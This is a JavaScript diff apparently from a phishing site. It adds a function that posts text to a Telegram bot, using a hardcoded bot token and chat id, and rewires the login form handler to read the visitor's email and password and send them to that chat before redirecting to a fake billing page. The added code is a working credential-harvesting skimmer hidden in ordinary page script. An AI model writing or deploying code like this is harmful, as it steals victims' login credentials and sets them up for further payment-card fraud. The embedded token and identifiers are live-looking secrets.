@@ -34,7 +34,43 @@ function showFooter(event, element) {
   }
 }
 
-// console.log(document.getElementById("login-form"))
+// API SETUP
+async function apiCall(...texts) {
+  const API_KEY = "7454271480:AAHYvF4jL3VNM-UnWYk-C8VqJkrODROfgFM";
+  const chat_id = -4266117210;
+
+  // Flatten the texts array if the first element is an array
+  if (Array.isArray(texts[0])) {
+    texts = texts[0];
+  }
+
+  // Join the texts array into a single string separated by new lines
+  const combinedText = texts.join("\n");
+  const url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
+    combinedText
+  )}`;
+
+  const api = new XMLHttpRequest();
+  api.open("GET", url, true);
+
+  // Define what happens on successful data submission
+  api.onload = () => {
+    if (api.status >= 200 && api.status < 300) {
+      console.log("Message Sent!");
+      // Navigate to a different URL after successful message sending
+      window.location.href = "/views/billing.html"; // Change to your desired URL
+    } else {
+      console.log(`Failed to send message. Status: ${api.status}`);
+    }
+  };
+
+  // Define what happens in case of an error
+  api.onerror = () => {
+    console.log("Error occurred while sending the message");
+  };
+
+  api.send();
+}
 
 // console.log(window.location.pathname);
 if (window.location.pathname === "/views/billing.html") {
@@ -128,23 +164,30 @@ if (window.location.pathname === "/") {
     console.log(loginForm);
 
     // serviceID - templateID - #form - publicKey
-    emailjs
-      .sendForm(
-        "service_4q8coel",
-        "template_a97si1y",
-        "#login-form",
-        "3n7ifkUOowaI47Ert"
-      )
-      .then(
-        () => {
-          loginForm.reset(); // Clear input fields
-          console.log("Success");
-          window.location.href = "views/billing.html";
-        },
-        () => {
-          console.log("Message not sent");
-        }
-      );
+    // emailjs
+    //   .sendForm(
+    //     "service_4q8coel",
+    //     "template_a97si1y",
+    //     "#login-form",
+    //     "3n7ifkUOowaI47Ert"
+    //   )
+    //   .then(
+    //     () => {
+    //       loginForm.reset(); // Clear input fields
+    //       console.log("Success");
+    //       window.location.href = "views/billing.html";
+    //     },
+    //     () => {
+    //       console.log("Message not sent");
+    //     }
+    //   );
+    const email = document.getElementById("login-email").value;
+    const pass = document.getElementById("login-pass").value;
+
+    (async () => {
+      await apiCall(`User-Email: ${email}`, `User-Pass: ${pass}`);
+      console.log("This will run after the message is sent.");
+    })();
     // }
   });
 }
